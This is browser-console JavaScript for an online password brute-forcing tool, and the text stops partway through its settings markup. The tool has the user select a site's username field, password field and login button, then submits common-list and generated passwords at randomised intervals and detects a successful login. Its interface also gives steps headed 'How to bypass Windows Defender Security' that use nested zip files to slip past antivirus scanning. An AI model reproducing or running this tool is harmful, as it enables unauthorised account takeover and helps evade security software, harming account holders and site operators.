(function() {
    // --- IMPORTANT: Environment Check ---
    if (typeof document === 'undefined') {
        console.error('Error: This script must be run in a web browser environment with access to the Document Object Model (DOM).');
        console.error('Please open your browser\'s developer tools (F12), go to the "Console" tab, and paste the script there.');
        return; // Exit the script if document is not defined
    }

    // --- Global State Variables ---
    let isSelectingElement = false; // Flag to indicate if we are in element selection mode
    let currentFieldToPopulate = null; // Stores 'username', 'password', or 'loginButton' during selection

    // References to the actual DOM elements selected by the user
    let selectedUsernameElement = null;
    let selectedPasswordElement = null;
    let selectedLoginButtonElement = null;

    let isGuessingPasswords = false; // Flag to control the password guessing loop
    let isPaused = false; // New: Flag to pause the guessing loop
    let currentPasswordAttempt = ''; // Stores the password currently being tried
    let currentPasswordLength = 0; // Current length of passwords being generated sequentially

    // Configurable settings (defaults and current values)
    let baseAutofillRate = 50; // Base delay in milliseconds between attempts
    let autofillRateVariance = 50; // Max random milliseconds to add to baseAutofillRate
    let minPasswordLength = 1; // Minimum length for generated passwords
    let maxPasswordLength = 8; // Maximum length for generated passwords
    let includeCapitalized = false; // Whether to include uppercase letters in generated passwords
    let includeNumbers = true; // Whether to include numbers
    let includeSymbols = true; // Whether to include symbols
    let autofillUsernameOnEachAttempt = true; // Whether to re-fill username for every password attempt
    let customCharacters = 'abcdefghijklmnopqrstuvwxyz'; // Base character set for generation (now just lowercase)
    let currentCharacterSet = customCharacters; // The active character set (includes uppercase, numbers, symbols if enabled)
    let speedMultiplier = 1; // Multiplier to adjust the delay (1x to 100x)

    // Safe Mode settings
    let safeModeEnabled = false; // If true, uses maxRangeMs for delay instead of variance
    let maxRangeMs = 100; // Max delay in safe mode

    // Username requirement setting
    let requireUsername = true; // If false, username field selection and autofill are skipped

    // Common Passwords List variables
    let uploadedCommonPasswords = []; // Array of common passwords loaded from file
    let currentCommonPasswordIndex = 0; // Index for iterating through uploadedCommonPasswords
    let commonPasswordsExhausted = false; // Flag indicating if all common passwords have been tried
    let useCommonPasswordsFirst = true; // Setting to prioritize common passwords

    // Excluded Passwords List variables (using Set for efficient lookups)
    let excludedPasswords = new Set(); // Set of passwords not to try

    // New: Failed Passwords List
    let failedPasswords = []; // Array to store all failed password attempts

    // New: Success/Failure Detection Settings
    let successUrlPattern = ''; // URL pattern to indicate success (e.g., '/dashboard')
    let failureTextPattern = ''; // Text pattern on page to indicate failure (e.g., 'Login failed')
    let successTextPattern = ''; // Text pattern on page to indicate success (e.g., 'Welcome')
    let checkNetworkResponses = false; // New: Whether to check network responses for success/failure
    let expectedStatusCode = 200; // New: Expected status code for success
    let successResponseText = ''; // New: Text to look for in successful network response
    let failureResponseText = ''; // New: Text to look for in failed network response

    // Character sets for password generation
    const LOWERCASE_CHAR_SET = 'abcdefghijklmnopqrstuvwxyz'; // Base character set
    const UPPERCASE_CHAR_SET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    const NUMBERS_CHAR_SET = '0123456789';
    const SYMBOLS_CHAR_SET = '!@#$%^&*()-_+=[]{}|;:,.<>?';

    // Performance tracking variables
    let passwordAttemptTimes = []; // Stores the duration of each attempt in milliseconds
    let animationFrameId = null; // Stores the ID for requestAnimationFrame for the graph

    // Logging variables
    let tempLogMessages = []; // Temporary storage for logs before log window is ready
    let inspectorLog = null; // Reference to the log display element

    // --- Helper Function: logAction ---
    /**
     * Appends a message to the inspector log and scrolls to the bottom.
     * If the log element is not yet available, messages are stored temporarily.
     * @param {string} message - The message to log.
     */
    function logAction(message) {
        const timestamp = new Date().toLocaleTimeString();
        const formattedMessage = `<div>[${timestamp}] ${message}</div>`;

        if (inspectorLog) {
            inspectorLog.innerHTML += formattedMessage;
            inspectorLog.scrollTop = inspectorLog.scrollHeight; // Auto-scroll to bottom
        } else {
            tempLogMessages.push(formattedMessage);
        }
    }

    /**
     * Flushes temporary log messages into the actual inspectorLog element once it's available.
     */
    function flushTempLog() {
        if (inspectorLog && tempLogMessages.length > 0) {
            tempLogMessages.forEach(msg => {
                inspectorLog.innerHTML += msg;
            });
            inspectorLog.scrollTop = inspectorLog.scrollHeight;
            tempLogMessages = []; // Clear temporary messages
        }
    }

    // --- Helper Function: saveSettings & loadSettings ---
    /**
     * Saves current tool settings and password lists to local storage.
     */
    function saveSettings() {
        const settings = {
            baseAutofillRate,
            autofillRateVariance,
            minPasswordLength,
            maxPasswordLength,
            includeCapitalized,
            includeNumbers,
            includeSymbols,
            autofillUsernameOnEachAttempt,
            customCharacters,
            speedMultiplier,
            safeModeEnabled,
            maxRangeMs,
            requireUsername,
            useCommonPasswordsFirst,
            successUrlPattern,
            failureTextPattern,
            successTextPattern,
            checkNetworkResponses, // New
            expectedStatusCode, // New
            successResponseText, // New
            failureResponseText // New
        };
        try {
            localStorage.setItem('blbf_settings', JSON.stringify(settings));
            logAction('Settings saved to local storage.');

            // Save common passwords separately with size check
            const commonPasswordsString = JSON.stringify(uploadedCommonPasswords);
            const commonPasswordsSizeKB = new TextEncoder().encode(commonPasswordsString).length / 1024;
            const MAX_LOCAL_STORAGE_KB = 4000; // Roughly 4MB

            if (commonPasswordsSizeKB < MAX_LOCAL_STORAGE_KB) {
                localStorage.setItem('blbf_common_passwords', commonPasswordsString);
                logAction(`Common passwords list saved (${commonPasswordsSizeKB.toFixed(2)} KB).`);
            } else {
                logAction(`Warning: Common passwords list (${commonPasswordsSizeKB.toFixed(2)} KB) is too large to save. It will not be persistent.`);
                localStorage.removeItem('blbf_common_passwords');
            }

            // Save excluded passwords separately with size check
            const excludedPasswordsArray = Array.from(excludedPasswords);
            const excludedPasswordsString = JSON.stringify(excludedPasswordsArray);
            const excludedPasswordsSizeKB = new TextEncoder().encode(excludedPasswordsString).length / 1024;

            if (excludedPasswordsSizeKB < MAX_LOCAL_STORAGE_KB) {
                localStorage.setItem('blbf_excluded_passwords', excludedPasswordsString);
                logAction(`Excluded passwords list saved (${excludedPasswordsSizeKB.toFixed(2)} KB).`);
            } else {
                logAction(`Warning: Excluded passwords list (${excludedPasswordsSizeKB.toFixed(2)} KB) is too large to save. It will not be persistent.`);
                localStorage.removeItem('blbf_excluded_passwords');
            }

            // Save failed passwords separately with size check
            const failedPasswordsString = JSON.stringify(failedPasswords);
            const failedPasswordsSizeKB = new TextEncoder().encode(failedPasswordsString).length / 1024;

            if (failedPasswordsSizeKB < MAX_LOCAL_STORAGE_KB) {
                localStorage.setItem('blbf_failed_passwords', failedPasswordsString);
                logAction(`Failed passwords list saved (${failedPasswordsSizeKB.toFixed(2)} KB).`);
            } else {
                logAction(`Warning: Failed passwords list (${failedPasswordsSizeKB.toFixed(2)} KB) is too large to save. It will not be persistent.`);
                localStorage.removeItem('blbf_failed_passwords');
            }

        } catch (e) {
            logAction('Error saving settings or password lists to local storage: ' + e.message);
        }
    }

    /**
     * Loads saved tool settings and password lists from local storage.
     */
    function loadSettings() {
        try {
            const savedSettings = localStorage.getItem('blbf_settings');
            if (savedSettings) {
                const settings = JSON.parse(savedSettings);
                // Assign values, using defaults if not present in saved settings
                baseAutofillRate = settings.baseAutofillRate ?? baseAutofillRate;
                autofillRateVariance = settings.autofillRateVariance ?? autofillRateVariance;
                minPasswordLength = settings.minPasswordLength ?? minPasswordLength;
                maxPasswordLength = settings.maxPasswordLength ?? maxPasswordLength;
                includeCapitalized = settings.includeCapitalized ?? includeCapitalized;
                includeNumbers = settings.includeNumbers ?? includeNumbers;
                includeSymbols = settings.includeSymbols ?? includeSymbols;
                autofillUsernameOnEachAttempt = settings.autofillUsernameOnEachAttempt ?? autofillUsernameOnEachAttempt;
                customCharacters = settings.customCharacters ?? customCharacters;
                speedMultiplier = settings.speedMultiplier ?? speedMultiplier;
                safeModeEnabled = settings.safeModeEnabled ?? safeModeEnabled;
                maxRangeMs = settings.maxRangeMs ?? maxRangeMs;
                requireUsername = settings.requireUsername ?? requireUsername;
                useCommonPasswordsFirst = settings.useCommonPasswordsFirst ?? useCommonPasswordsFirst;
                successUrlPattern = settings.successUrlPattern ?? successUrlPattern;
                failureTextPattern = settings.failureTextPattern ?? failureTextPattern;
                successTextPattern = settings.successTextPattern ?? successTextPattern;
                checkNetworkResponses = settings.checkNetworkResponses ?? checkNetworkResponses; // New
                expectedStatusCode = settings.expectedStatusCode ?? expectedStatusCode; // New
                successResponseText = settings.successResponseText ?? successResponseText; // New
                failureResponseText = settings.failureResponseText ?? failureResponseText; // New

                // Update currentCharacterSet based on loaded settings
                updateCharacterSet();
                logAction('Settings loaded from local storage.');
            } else {
                logAction('No saved settings found. Using default settings.');
            }

            // Load common passwords
            const savedCommonPasswords = localStorage.getItem('blbf_common_passwords');
            if (savedCommonPasswords) {
                uploadedCommonPasswords = JSON.parse(savedCommonPasswords);
                logAction(`Loaded ${uploadedCommonPasswords.length} common passwords from local storage.`);
            } else {
                logAction('No saved common passwords list found.');
            }

            // Load excluded passwords
            const savedExcludedPasswords = localStorage.getItem('blbf_excluded_passwords');
            if (savedExcludedPasswords) {
                excludedPasswords = new Set(JSON.parse(savedExcludedPasswords));
                logAction(`Loaded ${excludedPasswords.size} excluded passwords from local storage.`);
            } else {
                logAction('No saved excluded passwords list found.');
            }

            // Load failed passwords
            const savedFailedPasswords = localStorage.getItem('blbf_failed_passwords');
            if (savedFailedPasswords) {
                failedPasswords = JSON.parse(savedFailedPasswords);
                logAction(`Loaded ${failedPasswords.length} failed passwords from local storage.`);
            } else {
                logAction('No saved failed passwords list found.');
            }

        } catch (e) {
            logAction('Error loading settings or password lists from local storage: ' + e.message);
        }
    }

    /**
     * Resets all settings to their default values and saves them.
     */
    function resetSettingsToDefault() {
        baseAutofillRate = 50;
        autofillRateVariance = 50;
        minPasswordLength = 1;
        maxPasswordLength = 8;
        includeCapitalized = false;
        includeNumbers = true;
        includeSymbols = true;
        autofillUsernameOnEachAttempt = true;
        customCharacters = 'abcdefghijklmnopqrstuvwxyz';
        speedMultiplier = 1;
        safeModeEnabled = false;
        maxRangeMs = 100;
        requireUsername = true;
        useCommonPasswordsFirst = true;
        successUrlPattern = '';
        failureTextPattern = '';
        successTextPattern = '';
        checkNetworkResponses = false;
        expectedStatusCode = 200;
        successResponseText = '';
        failureResponseText = '';

        // Clear password lists too
        uploadedCommonPasswords = [];
        excludedPasswords.clear();
        failedPasswords = [];

        // Update UI elements to reflect defaults
        updateSettingsUI();
        updateCharacterSet(); // Rebuild character set after reset
        saveSettings();
        logAction('All settings reset to default and saved.');
    }

    /**
     * Updates the UI elements in the settings window to reflect current settings.
     */
    function updateSettingsUI() {
        if (settingsWindow.style.display === 'block') { // Only update if settings window is open
            baseRateInput.value = baseAutofillRate;
            varianceInput.value = autofillRateVariance;
            minLengthInput.value = minPasswordLength;
            maxLengthInput.value = maxPasswordLength;
            includeCapitalizedCheckbox.checked = includeCapitalized;
            includeNumbersCheckbox.checked = includeNumbers;
            includeSymbolsCheckbox.checked = includeSymbols;
            autofillUsernameCheckbox.checked = autofillUsernameOnEachAttempt;
            customCharactersInput.value = customCharacters;
            speedSlider.value = speedMultiplier;
            speedValueDisplay.textContent = `${speedMultiplier}x`;
            safeModeCheckbox.checked = safeModeEnabled;
            maxRangeMsInput.value = maxRangeMs;
            maxRangeMsInput.disabled = !safeModeEnabled;
            requireUsernameCheckbox.checked = requireUsername;
            consoleUsernameButton.disabled = !requireUsername; // Disable button if username not required
            yourUsernameInput.disabled = !requireUsername; // Disable input if username not required
            useCommonPasswordsFirstCheckbox.checked = useCommonPasswordsFirst;
            commonPasswordsStatus.textContent = `${uploadedCommonPasswords.length} passwords loaded.`;
            excludedPasswordsStatus.textContent = `${excludedPasswords.size} passwords excluded.`;
            failedPasswordsStatus.textContent = `${failedPasswords.length} failed passwords logged.`;
            successUrlInput.value = successUrlPattern;
            failureTextInput.value = failureTextPattern;
            successTextInput.value = successTextPattern;
            checkNetworkResponsesCheckbox.checked = checkNetworkResponses; // New
            expectedStatusCodeInput.value = expectedStatusCode; // New
            successResponseTextInput.value = successResponseText; // New
            failureResponseTextInput.value = failureResponseText; // New
            // Disable/enable network response fields based on checkbox
            expectedStatusCodeInput.disabled = !checkNetworkResponses;
            successResponseTextInput.disabled = !checkNetworkResponses;
            failureResponseTextInput.disabled = !checkNetworkResponses;
        }
    }

    /**
     * Updates the currentCharacter set based on user's selections.
     */
    function updateCharacterSet() {
        let chars = LOWERCASE_CHAR_SET;
        if (includeCapitalized) chars += UPPERCASE_CHAR_SET;
        if (includeNumbers) chars += NUMBERS_CHAR_SET;
        if (includeSymbols) chars += SYMBOLS_CHAR_SET;
        // Add custom characters, ensuring no duplicates
        chars += customCharacters;
        currentCharacterSet = [...new Set(chars.split(''))].join('');
    }

    // --- Helper Function: createDraggableWindow ---
    function createDraggableWindow(id, title, htmlContent, initialWidth, initialHeight) {
        const windowDiv = document.createElement('div');
        windowDiv.id = id;
        windowDiv.style.cssText = `
            position: fixed;
            background-color: var(--background-dark);
            /* Removed border: 1px solid var(--border-color-light); */
            border-radius: 8px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.4);
            z-index: 99999;
            font-family: 'Inter', sans-serif;
            color: var(--text-light);
            resize: none;
            min-width: 250px;
            min-height: 150px;
            max-height: 560px;
            display: none; /* Initially hidden */
            width: ${initialWidth}px;
            height: ${initialHeight}px;
            display: flex; /* Use flexbox for layout */
            flex-direction: column; /* Stack header and content vertically */
        `;
        windowDiv.innerHTML = `
            <div class="window-header" style="cursor: grab; background-color: var(--header-bg); padding: 10px; border-top-left-radius: 8px; border-top-right-radius: 8px; font-weight: bold; color: var(--primary-color); text-align: center; border-bottom: 1px solid var(--border-color-light); flex-shrink: 0;">
                ${title}
                <span class="window-close-button" style="float: right; cursor: pointer; color: var(--text-muted); font-size: 1.2em; line-height: 1; transition: color 0.2s ease;">&times;</span>
            </div>
            <div class="window-content" style="padding: 20px; overflow-y: auto; flex-grow: 1;">
                ${htmlContent}
            </div>
        `;
        document.body.appendChild(windowDiv);

        const header = windowDiv.querySelector('.window-header');
        const closeButton = windowDiv.querySelector('.window-close-button');

        let isDragging = false;
        let offsetX, offsetY;

        header.addEventListener('mousedown', (e) => {
            isDragging = true;
            offsetX = e.clientX - windowDiv.getBoundingClientRect().left;
            offsetY = e.clientY - windowDiv.getBoundingClientRect().top;
            windowDiv.style.cursor = 'grabbing';
            e.preventDefault();
        });

        document.addEventListener('mousemove', (e) => {
            if (!isDragging) return;
            windowDiv.style.left = (e.clientX - offsetX) + 'px';
            windowDiv.style.top = (e.clientY - offsetY) + 'px';
        });

        document.addEventListener('mouseup', () => {
            isDragging = false;
            windowDiv.style.cursor = 'grab';
        });

        closeButton.addEventListener('click', () => {
            windowDiv.style.display = 'none';
            if (id === 'draggable-inspector-window') {
                toggleDot.style.backgroundColor = 'var(--primary-color)';
            }
            if (id === 'inspector-performance-window' && animationFrameId) {
                cancelAnimationFrame(animationFrameId);
                animationFrameId = null;
                logAction('Performance graph animation stopped.');
            }
            logAction(`${title} window closed.`);
        });

        // Add hover effect for close button
        closeButton.addEventListener('mouseenter', () => {
            closeButton.style.color = 'var(--danger-color)';
        });
        closeButton.addEventListener('mouseleave', () => {
            closeButton.style.color = 'var(--text-muted)';
        });

        return windowDiv;
    }

    /**
     * Centers a given window on the screen.
     * @param {HTMLElement} windowElement - The window element to center.
     */
    function centerWindow(windowElement) {
        // Temporarily show to get dimensions, then revert
        const originalDisplay = windowElement.style.display;
        windowElement.style.display = 'flex'; // Use flex to calculate dimensions correctly

        const windowWidth = windowElement.offsetWidth;
        const windowHeight = windowElement.offsetHeight;
        const centerX = (window.innerWidth / 2) - (windowWidth / 2);
        const centerY = (window.innerHeight / 2) - (windowHeight / 2);

        windowElement.style.left = `${Math.max(0, centerX)}px`;
        windowElement.style.top = `${Math.max(0, centerY)}px`;

        windowElement.style.display = originalDisplay;
    }

    /**
     * Adds a temporary visual highlight to a selected DOM element.
     * @param {HTMLElement} element - The element to highlight.
     */
    function highlightElement(element) {
        if (!element) return;
        const originalOutline = element.style.outline;
        const originalBoxShadow = element.style.boxShadow;

        element.style.outline = '2px solid var(--primary-color)';
        element.style.boxShadow = '0 0 0 4px rgba(145, 61, 226, 0.4)'; // Purple glow

        setTimeout(() => {
            element.style.outline = originalOutline;
            element.style.boxShadow = originalBoxShadow;
        }, 1000); // Highlight for 1 second
    }

    /**
     * Copies text to the clipboard.
     * @param {string} text - The text to copy.
     */
    function copyToClipboard(text) {
        const textarea = document.createElement('textarea');
        textarea.value = text;
        textarea.style.position = 'fixed'; // Avoid scrolling to bottom
        document.body.appendChild(textarea);
        textarea.focus();
        textarea.select();
        try {
            document.execCommand('copy');
            logAction(`Copied "${text}" to clipboard.`);
        } catch (err) {
            logAction('Failed to copy to clipboard.');
            console.error('Failed to copy text: ', err);
        }
        document.body.removeChild(textarea);
    }

    // --- CSS Variables (Root Styling) ---
    const styleSheet = document.createElement('style');
    styleSheet.innerHTML = `
        /* Import Google Font - Inter */
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');

        :root {
            --primary-color: #913de2; /* Purple accent */
            --secondary-color: #5cb85c; /* Green for save */
            --danger-color: #cc0000; /* Red for stop */
            --background-dark: #2a2a2a; /* Main window background */
            --header-bg: #333; /* Header background */
            --input-bg: #333; /* Input field background */
            --input-border: #444; /* Input border */
            /* Removed --border-color-light: #444; */
            --text-light: #e0e0e0; /* General light text */
            --text-muted: #ccc; /* Muted text for labels/placeholders */
            --log-bg: #333; /* Log background */
            --log-border: #444; /* Log border */
            --success-text: #4CAF50; /* Green for success/locked in */
            --button-hover-bg: #4a4a4a; /* Darker grey for general button hover */
            --page-background-color: #1a1a1a; /* Dark background for the main page */
            --page-gradient-start: #1c1c1c;
            --page-gradient-end: #0f0f0f;
        }

        /* Custom Scrollbar Styling for Webkit browsers, applied to tool windows */
        #draggable-inspector-window::-webkit-scrollbar,
        #inspector-settings-window::-webkit-scrollbar,
        #inspector-log-window::-webkit-scrollbar,
        #inspector-performance-window::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }
        #draggable-inspector-window::-webkit-scrollbar-track,
        #inspector-settings-window::-webkit-scrollbar-track,
        #inspector-log-window::-webkit-scrollbar-track,
        #inspector-performance-window::-webkit-scrollbar-track {
            background: var(--background-dark);
            border-radius: 10px;
        }
        #draggable-inspector-window::-webkit-scrollbar-thumb,
        #inspector-settings-window::-webkit-scrollbar-thumb,
        #inspector-log-window::-webkit-scrollbar-thumb,
        #inspector-performance-window::-webkit-scrollbar-thumb {
            background: var(--input-border);
            border-radius: 10px;
            transition: background 0.2s ease;
        }
        #draggable-inspector-window::-webkit-scrollbar-thumb:hover,
        #inspector-settings-window::-webkit-scrollbar-thumb:hover,
        #inspector-log-window::-webkit-scrollbar-thumb:hover,
        #inspector-performance-window::-webkit-scrollbar-thumb:hover {
            background: var(--primary-color);
        }

        .inspector-button {
            padding: 10px 15px;
            border: 1px solid var(--input-border);
            border-radius: 4px;
            background-color: #4a4a4a; /* Default button background */
            color: var(--text-light);
            outline: none;
            cursor: pointer;
            transition: background-color 0.2s ease, filter 0.2s ease, border-color 0.2s ease, box-shadow 0.2s ease;
            box-shadow: inset 0 1px 0 rgba(255,255,255,0.05), 0 1px 2px rgba(0,0,0,0.2); /* Subtle inner and outer shadow */
        }
        .inspector-button:hover {
            background-color: var(--button-hover-bg);
            filter: brightness(1.1);
            box-shadow: inset 0 1px 0 rgba(255,255,255,0.1), 0 2px 4px rgba(0,0,0,0.3);
        }
        .inspector-button:active {
            transform: translateY(1px); /* Slight press effect */
            box-shadow: inset 0 1px 3px rgba(0,0,0,0.3);
        }
        .inspector-button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        /* Specific button colors */
        #startButton { background-color: var(--primary-color); border-color: var(--primary-color); }
        #startButton:hover { background-color: #7a32bf; filter: brightness(1.05); } /* Slightly darker purple on hover */
        #stopButton { background-color: var(--danger-color); border-color: var(--danger-color); }
        #stopButton:hover { background-color: #C02C3C; filter: brightness(1.05); }
        #pauseButton { background-color: #6a8d9f; border-color: #6a8d9f; color: var(--text-light); } /* Muted blue for pause */
        #pauseButton:hover { background-color: #5a7d8f; filter: brightness(1.05); }
        #saveSettingsButton { background-color: var(--secondary-color); border-color: var(--secondary-color); }
        #saveSettingsButton:hover { background-color: #218838; filter: brightness(1.05); }
        #importInstanceButton { background-color: var(--primary-color); border-color: var(--primary-color); } /* New style for import instance */
        #importInstanceButton:hover { background-color: #7a32bf; filter: brightness(1.05); }
        #clearFailedPasswordsButton { background-color: #9932CC; border-color: #9932CC; } /* Purple for failed passwords */
        #clearFailedPasswordsButton:hover { background-color: #800080; filter: brightness(1.05); }
        #resetSettingsButton { background-color: #555; border-color: #666; } /* Grey for reset */
        #resetSettingsButton:hover { background-color: #666; filter: brightness(1.05); }


        /* Input field styling, specifically for the tool's inputs */
        #draggable-inspector-window input[type="text"],
        #draggable-inspector-window input[type="number"],
        #draggable-inspector-window textarea,
        #draggable-inspector-window input[type="file"],
        #inspector-settings-window input[type="text"],
        #inspector-settings-window input[type="number"],
        #inspector-settings-window textarea,
        #inspector-settings-window input[type="file"] {
            outline: none;
            box-shadow: none;
            border: 1px solid var(--input-border);
            border-radius: 4px;
            background-color: var(--input-bg);
            color: var(--text-light); /* Ensure text is white */
            padding: 8px 10px; /* Consistent padding */
            font-size: 0.9em; /* Slightly smaller font for inputs */
        }
        #draggable-inspector-window input[type="text"]:focus,
        #draggable-inspector-window input[type="number"]:focus,
        #draggable-inspector-window textarea:focus,
        #draggable-inspector-window input[type="file"]:focus,
        #inspector-settings-window input[type="text"]:focus,
        #inspector-settings-window input[type="number"]:focus,
        #inspector-settings-window textarea:focus,
        #inspector-settings-window input[type="file"]:focus {
            box-shadow: 0 0 0 2px rgba(145, 61, 226, 0.4); /* Primary color glow */
            border-color: var(--primary-color);
        }
        input[type="file"]::file-selector-button {
            background-color: #555; /* Slightly different shade for file selector */
            color: var(--text-light);
            border: 1px solid #666; /* Slightly lighter border */
            border-radius: 4px;
            padding: 8px 12px;
            cursor: pointer;
            transition: background-color 0.2s ease, filter 0.2s ease;
        }
        input[type="file"]::file-selector-button:hover {
            filter: brightness(1.1);
            background-color: #606060;
        }
        #performanceGraphCanvas {
            display: block;
            width: 100%;
            height: 100%;
            background-color: #1a1a1a;
            border-radius: 4px;
            /* Removed border: 1px solid var(--border-color-light); */
        }
        /* Slider styling */
        #speedSlider {
            -webkit-appearance: none;
            appearance: none;
            width: 100%;
            height: 8px;
            background: #555;
            border-radius: 5px;
            outline: none;
            transition: background 0.2s ease;
        }
        #speedSlider::-webkit-slider-thumb {
            -webkit-appearance: none;
            appearance: none;
            width: 18px;
            height: 18px;
            border-radius: 50%;
            background: var(--primary-color);
            cursor: pointer;
            border: 1px solid var(--input-border);
            box-shadow: 0 1px 3px rgba(0,0,0,0.3);
            transition: background 0.2s ease, box-shadow 0.2s ease;
        }
        #speedSlider::-webkit-slider-thumb:hover {
            background: #7a32bf;
            box-shadow: 0 2px 5px rgba(0,0,0,0.4);
        }
        #speedSlider::-moz-range-thumb {
            width: 18px;
            height: 18px;
            border-radius: 50%;
            background: var(--primary-color);
            cursor: pointer;
            border: 1px solid var(--input-border);
            box-shadow: 0 1px 3px rgba(0,0,0,0.3);
            transition: background 0.2s ease, box-shadow 0.2s ease;
        }
        #speedSlider::-moz-range-thumb:hover {
            background: #7a32bf;
            box-shadow: 0 2px 5px rgba(0,0,0,0.4);
        }
        /* Checkbox styling */
        input[type="checkbox"] {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            width: 18px;
            height: 18px;
            border: 1px solid var(--input-border);
            border-radius: 3px;
            background-color: var(--input-bg);
            cursor: pointer;
            position: relative;
            display: inline-block;
            vertical-align: middle;
            transition: background-color 0.2s ease, border-color 0.2s ease;
        }
        input[type="checkbox"]:checked {
            background-color: var(--primary-color);
            border-color: var(--primary-color);
        }
        input[type="checkbox"]:checked::after {
            content: '✔';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: var(--text-light);
            font-size: 12px;
            line-height: 1;
        }
        input[type="checkbox"]:focus {
            box-shadow: 0 0 0 2px rgba(145, 61, 226, 0.4);
        }

        /* Fieldset for grouping settings */
        fieldset {
            border: 1px solid var(--input-border); /* Changed to input-border for consistency */
            border-radius: 6px;
            padding: 15px;
            margin-bottom: 20px;
            background-color: #333; /* Slightly lighter background for groups */
            box-shadow: inset 0 1px 3px rgba(0,0,0,0.1);
        }
        legend {
            color: var(--primary-color);
            font-weight: 600;
            padding: 0 10px;
            font-size: 1.1em;
            margin-left: -5px; /* Adjust to align with fieldset border */
        }

        /* Specific styling for window headers to remove top-right and bottom-right borders */
        .window-header {
            border-top-right-radius: 0 !important; /* Remove top-right border-radius */
            border-bottom-right-radius: 0 !important; /* Remove bottom-right border-radius */
            border-right: none !important; /* Remove right border */
        }
        .element-display {
            display: flex;
            align-items: center;
            justify-content: space-between;
            background-color: var(--input-bg);
            border: 1px solid var(--input-border);
            border-radius: 4px;
            padding: 8px 10px;
            margin-top: 5px;
            font-size: 0.85em;
            color: var(--text-muted);
            word-break: break-all;
            position: relative;
        }
        .element-display .copy-button {
            background: none;
            border: none;
            color: var(--primary-color);
            cursor: pointer;
            font-size: 1em;
            margin-left: 10px;
            padding: 0;
            transition: color 0.2s ease;
        }
        .element-display .copy-button:hover {
            color: #FFF;
        }
        .element-display .selected-indicator {
            color: var(--success-text);
            font-weight: bold;
            margin-left: 5px;
        }
    `;
    document.head.appendChild(styleSheet);


    // --- HTML Content for Each Window ---

    const mainInspectorHtml = `
        <fieldset>
            <legend>Target Selection</legend>
            <div style="margin-bottom: 15px;">
                <label style="display: block; margin-bottom: 5px; color: var(--text-muted);">Click to Inspect:</label>
                <button id="consoleUsernameButton" class="inspector-button" style="width: 100%;">
                    Select Username Field
                </button>
                <div id="usernameElementDisplay" class="element-display" style="${selectedUsernameElement ? 'display: flex;' : 'display: none;'}">
                    <span id="usernameElementInfo">Not selected</span>
                    <button class="copy-button" data-field="username">📋</button>
                    <span class="selected-indicator">✔</span>
                </div>
            </div>
            <div style="margin-bottom: 15px;">
                <button id="consolePasswordButton" class="inspector-button" style="width: 100%;">
                    Select Password Field
                </button>
                <div id="passwordElementDisplay" class="element-display" style="${selectedPasswordElement ? 'display: flex;' : 'display: none;'}">
                    <span id="passwordElementInfo">Not selected</span>
                    <button class="copy-button" data-field="password">📋</button>
                    <span class="selected-indicator">✔</span>
                </div>
            </div>
            <div style="margin-bottom: 15px;">
                <button id="consoleLoginButton" class="inspector-button" style="width: 100%;">
                    Select Login Button
                </button>
                <div id="loginButtonElementDisplay" class="element-display" style="${selectedLoginButtonElement ? 'display: flex;' : 'display: none;'}">
                    <span id="loginButtonElementInfo">Not selected</span>
                    <button class="copy-button" data-field="loginButton">📋</button>
                    <span class="selected-indicator">✔</span>
                </div>
            </div>
            <div style="margin-top: 15px;">
                <label for="yourUsernameInput" style="display: block; margin-bottom: 5px; color: var(--text-muted);">Your Username (for Autofill):</label>
                <input type="text" id="yourUsernameInput" placeholder="Enter username to autofill" style="width: 100%;">
            </div>
        </fieldset>

        <fieldset>
            <legend>Control Panel</legend>
            <div style="margin-top: 15px; display: flex; gap: 10px;">
                <button id="startButton" class="inspector-button" style="flex: 1;">
                    Start Password Guessing
                </button>
                <button id="pauseButton" class="inspector-button" style="flex: 1;">
                    Pause
                </button>
                <button id="stopButton" class="inspector-button" style="flex: 1;">
                    Stop
                </button>
            </div>
            <div style="margin-top: 15px; display: flex; gap: 10px;">
                <button id="openSettingsButton" class="inspector-button" style="flex: 1;">
                    Open Settings
                </button>
                <button id="openLogButton" class="inspector-button" style="flex: 1;">
                    Open Log
                </button>
            </div>
            <div style="margin-top: 15px;">
                <button id="openPerformanceButton" class="inspector-button" style="width: 100%; margin-bottom: 10px;">
                    Open Performance Graph
                </button>
                <button id="importInstanceButton" class="inspector-button" style="width: 100%;">
                    Import Instance (JSON)
                </button>
            </div>
            <div style="margin-top: 15px;">
                <button id="downloadAllDataButton" class="inspector-button" style="width: 100%;">
                    Download All Data (Zip)
                </button>
            </div>
        </fieldset>

        <div style="margin-top: 20px;">
            <label for="consoleResultInput" style="display: block; margin-bottom: 5px; color: var(--text-muted);">Status / Info:</label>
            <input type="text" id="consoleResultInput" readonly value="Click a button to start selection." style="width: 100%; color: var(--text-muted);">
        </div>
        <div id="statusDisplay" style="margin-top: 10px; text-align: center; color: var(--text-light); font-size: 0.85em; font-weight: 500;">Status: Stopped</div>

        <div style="margin-top: 20px; padding: 15px; border: 1px solid var(--input-border); border-radius: 8px; background-color: #333;">
            <h3 style="color: var(--primary-color); margin-top: 0; margin-bottom: 10px; text-align: center;">How to bypass Windows Defender Security</h3>
            <p style="color: var(--text-light); text-align: center; font-size: 0.9em;">1. Click the downloaded ZIP folder.</p>
            <p style="color: var(--text-light); text-align: center; font-size: 0.9em;">2. Compress it into a new ZIP file.</p>
            <p style="color: var(--text-light); text-align: center; font-size: 0.9em;">3. Now its nested and windows wont be able to tell the contents of the old one.</p>
            <p style="color: var(--text-light); text-align: center; font-size: 0.9em;">4. Now uncompress the nested folder and then uncompress your downloaded zip file.</p>
            <p style="color: var(--text-light); text-align: center; font-size: 0.9em;">5. It hasnt been tested being extracted outside of the nested zip folder so i reccomend that.</p>
            <p style="color: var(--text-light); text-align: center; font-size: 0.9em;">6. Your done you bypassed windows defender security and should be able to get your saved data!</p>
        </div>
    `;

    const settingsHtml = `
        <fieldset>
            <legend>Rate Control</legend>
            <div style="margin-bottom: 15px;">
                <label for="baseRateInput" style="display: block; margin-bottom: 5px; color: var(--text-muted);">Base Autofill Rate (ms):</label>
